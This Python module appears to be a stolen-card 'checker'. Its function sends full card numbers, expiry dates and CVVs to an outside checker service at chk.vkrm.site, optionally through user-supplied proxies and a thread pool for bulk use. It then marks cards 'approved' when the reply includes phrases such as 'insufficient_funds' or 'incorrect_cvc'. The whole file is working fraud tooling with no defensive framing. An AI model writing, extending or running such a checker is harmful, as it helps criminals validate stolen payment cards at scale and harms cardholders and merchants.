import requests
import asyncio
from concurrent.futures import ThreadPoolExecutor

executor = ThreadPoolExecutor(max_workers=10)

# Braintree CVV Auth API configuration
BRAINTREE_API_BASE_URL = "https://chk.vkrm.site/"

# Successful CVV authentication responses
CVV_SUCCESS_RESPONSES = [
    "cvv matched",
    "cvv_success",
    "cvv_verified",
    "cvv correct",
    "authenticated",
    "authenticate_successful",
    "approved",
    "insufficient_funds",
    "incorrect_cvc",
    "card_decline_rate_limit_exceeded",
    "success"
]


def check_braintree_cvv(card, mes, ano, cvv, proxy=None):
    """
    Check Braintree CVV authentication status using chk.vkrm.site

    Args:
        card: Card number
        mes: Expiry month
        ano: Expiry year (2 or 4 digits)
        cvv: CVV code
        proxy: Optional proxy in format user:pass@ip:port

    Returns:
        dict with status and response
    """
    try:
        # Normalize year format to 2 digits
        if len(ano) == 4:
            ano = ano[2:]

        # Format card data as required by API: card|mm|yy|cvv
        card_string = f"{card}|{mes}|{ano}|{cvv}"

        # Build API URL with parameters
        params = {
            "card": card_string
        }

        # Add proxy if provided
        if proxy:
            params["proxy"] = proxy

        # Configure proxy for requests if provided
        proxies = None
        if proxy:
            # Format proxy for requests library
            proxy_url = f"http://{proxy}"
            proxies = {
                "http": proxy_url,
                "https": proxy_url
            }

        # Make request to Braintree CVV Auth API
        response = requests.get(
            BRAINTREE_API_BASE_URL,
            params=params,
            proxies=proxies,
            timeout=60
        )

        # Check response status
        if response.status_code != 200:
            return {
                "status": "error",
                "response": f"API Error: HTTP {response.status_code}"
            }

        # Parse response
        try:
            data = response.json()
        except:
            # If not JSON, treat as text response
            response_text = response.text.strip()

            # Check if response contains any success indicator
            response_lower = response_text.lower()
            for success_response in CVV_SUCCESS_RESPONSES:
                if success_response.lower() in response_lower:
                    return {
                        "status": "approved",
                        "response": response_text or f"CVV Authenticated ✓"
                    }

            # Check for decline/error indicators
            if any(decline in response_lower for decline in ["declined", "invalid", "failed", "error"]):
                return {
                    "status": "declined",
                    "response": response_text or "CVV Authentication Failed"
                }

            return {
                "status": "declined",
                "response": response_text or "CVV Authentication Failed"
            }

        # Handle JSON response
        if isinstance(data, dict):
            # Check for status field
            if "status" in data:
                status_value = str(data.get("status", "")).lower()

                # Check if status indicates success
                for success_response in CVV_SUCCESS_RESPONSES:
                    if success_response.lower() in status_value:
                        return {
                            "status": "approved",
                            "response": data.get("message", data.get("response", data.get("status")))
                        }

                # Check for decline indicators
                if any(decline in status_value for decline in ["declined", "invalid", "failed"]):
                    return {
                        "status": "declined",
                        "response": data.get("message", data.get("response", data.get("status")))
                    }

            # Check for message field
            if "message" in data:
                message_value = str(data.get("message", "")).lower()

                for success_response in CVV_SUCCESS_RESPONSES:
                    if success_response.lower() in message_value:
                        return {
                            "status": "approved",
                            "response": data.get("message")
                        }

                # Check for decline indicators
                if any(decline in message_value for decline in ["declined", "invalid", "failed"]):
                    return {
                        "status": "declined",
                        "response": data.get("message")
                    }

            # Check for response field
            if "response" in data:
                response_value = str(data.get("response", "")).lower()

                for success_response in CVV_SUCCESS_RESPONSES:
                    if success_response.lower() in response_value:
                        return {
                            "status": "approved",
                            "response": data.get("response")
                        }

                # Check for decline indicators
                if any(decline in response_value for decline in ["declined", "invalid", "failed"]):
                    return {
                        "status": "declined",
                        "response": data.get("response")
                    }

            # No recognized fields, check entire response
            response_str = str(data).lower()
            for success_response in CVV_SUCCESS_RESPONSES:
                if success_response.lower() in response_str:
                    return {
                        "status": "approved",
                        "response": str(data)
                    }

            return {
                "status": "declined",
                "response": str(data)
            }

        # Handle non-dict JSON response
        response_str = str(data).lower()
        for success_response in CVV_SUCCESS_RESPONSES:
            if success_response.lower() in response_str:
                return {
                    "status": "approved",
                    "response": str(data)
                }

        return {
            "status": "declined",
            "response": str(data)
        }

    except requests.exceptions.Timeout:
        return {
            "status": "error",
            "response": "Request timeout - API took too long to respond"
        }
    except requests.exceptions.ConnectionError:
        return {
            "status": "error",
            "response": "Connection error - Unable to reach Braintree CVV API"
        }
    except Exception as e:
        return {
            "status": "error",
            "response": f"Error: {str(e)}"
        }


async def async_check_braintree_cvv(card, mes, ano, cvv, proxy=None):
    """
    Async wrapper for Braintree CVV checking

    Args:
        card: Card number
        mes: Expiry month
        ano: Expiry year
        cvv: CVV code
        proxy: Optional proxy in format user:pass@ip:port

    Returns:
        dict with status and response
    """
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(executor, check_braintree_cvv, card, mes, ano, cvv, proxy)
